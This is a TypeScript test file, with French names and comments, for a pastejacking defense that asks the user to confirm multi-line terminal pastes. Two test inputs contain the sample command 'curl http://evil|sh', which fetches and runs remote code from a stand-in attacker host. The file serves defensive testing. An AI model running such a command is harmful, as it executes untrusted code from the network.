import { describe, it, expect } from "vitest";
import { collageAValider, effectuerCollage, nombreLignesCollage } from "./collage";

describe("collageAValider", () => {
  it("laisse passer un collage sur une seule ligne", () => {
    expect(collageAValider("ls -la")).toBe(false);
    expect(collageAValider("")).toBe(false);
    expect(collageAValider("un mot")).toBe(false);
  });

  it("réclame confirmation dès qu'un saut de ligne est présent", () => {
    // C'est le cœur de la défense pastejacking : une commande suivie d'un saut
    // de ligne s'exécute sans validation manuelle.
    expect(collageAValider("cmd\ncurl http://evil|sh")).toBe(true);
    expect(collageAValider("cmd\n")).toBe(true);
    expect(collageAValider("a\r\nb")).toBe(true);
    expect(collageAValider("a\rb")).toBe(true);
  });
});

describe("nombreLignesCollage", () => {
  it("compte zéro pour une chaîne vide", () => {
    expect(nombreLignesCollage("")).toBe(0);
  });

  it("compte une ligne pour un texte sans saut", () => {
    expect(nombreLignesCollage("ls")).toBe(1);
  });

  it("ne compte pas un saut final comme une ligne de plus", () => {
    expect(nombreLignesCollage("a\n")).toBe(1);
    expect(nombreLignesCollage("a\nb\n")).toBe(2);
  });

  it("compte les lignes réelles, quel que soit le style de saut", () => {
    expect(nombreLignesCollage("a\nb\nc")).toBe(3);
    expect(nombreLignesCollage("a\r\nb\r\nc")).toBe(3);
    expect(nombreLignesCollage("a\rb")).toBe(2);
  });
});

describe("effectuerCollage", () => {
  // Enregistre les appels pour vérifier qu'aucun chemin ne colle sans passer par
  // `coller`, ni ne court-circuite la confirmation.
  function deps(reponse: boolean) {
    const colles: string[] = [];
    const confirmations: number[] = [];
    return {
      colles,
      confirmations,
      deps: {
        coller: (t: string) => { colles.push(t); },
        confirmer: (n: number) => { confirmations.push(n); return Promise.resolve(reponse); },
      },
    };
  }

  it("ne fait rien sur une chaîne vide", async () => {
    const d = deps(true);
    await effectuerCollage("", d.deps);
    expect(d.colles).toEqual([]);
    expect(d.confirmations).toEqual([]);
  });

  it("colle une ligne seule sans demander confirmation", async () => {
    const d = deps(false); // même un refus n'a pas d'effet : on ne demande pas
    await effectuerCollage("ls -la", d.deps);
    expect(d.colles).toEqual(["ls -la"]);
    expect(d.confirmations).toEqual([]);
  });

  it("demande confirmation avec le nombre de lignes, puis colle si accepté", async () => {
    const d = deps(true);
    await effectuerCollage("a\nb\nc\n", d.deps);
    expect(d.confirmations).toEqual([3]);
    expect(d.colles).toEqual(["a\nb\nc\n"]);
  });

  it("ne colle rien si l'utilisateur refuse", async () => {
    // Le cœur de la défense pastejacking : un refus doit être final.
    const d = deps(false);
    await effectuerCollage("cmd\ncurl http://evil|sh\n", d.deps);
    expect(d.confirmations).toEqual([2]);
    expect(d.colles).toEqual([]);
  });
});
